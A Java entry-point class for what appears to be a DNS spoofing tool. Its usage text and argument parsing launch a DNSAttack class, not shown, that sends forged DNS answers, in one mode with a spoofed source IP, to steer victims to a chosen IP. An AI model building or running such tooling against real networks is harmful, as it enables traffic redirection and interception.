public class Main {
    private static final int goodExitStatus = 0;

    public static void main(String[] args) {
        if (args.length < 3 || args.length > 4) {
            System.out.println("Usage: Main <mode_number>...");
            System.out.println("Usage: Main 1 <timeout_millis> <erroneous_ip>");
            System.out.println("Usage: Main 2 <fake_source_ip> <timeout_millis> <erroneous_ip>");
            System.out.println("- Mode 1: send fake answer to the first sniffed query.");
            System.out.println("- Mode 2: send fake answer to a host that queries this machine.");
            System.out.println("This program was designed only for IPv4");
            return;
        }
        final int mode = Integer.parseInt(args[0]);
        if (mode == 1) {
            final int timeoutMillis = Integer.parseInt(args[1]);
            final String erroneousIP = args[2];
            new DNSAttack().sendFakeAnswerToSniffedQuery(timeoutMillis, erroneousIP);
        } else if (mode == 2) {
            final String fakeSourceIP = args[1];
            final int timeoutMillis = Integer.parseInt(args[2]);
            final String erroneousIP = args[3];
            new DNSAttack().sendFakeAnswerToHost(fakeSourceIP, timeoutMillis, erroneousIP);
        } else
            System.out.println("Invalid mode.");
        System.exit(goodExitStatus);
    }
}
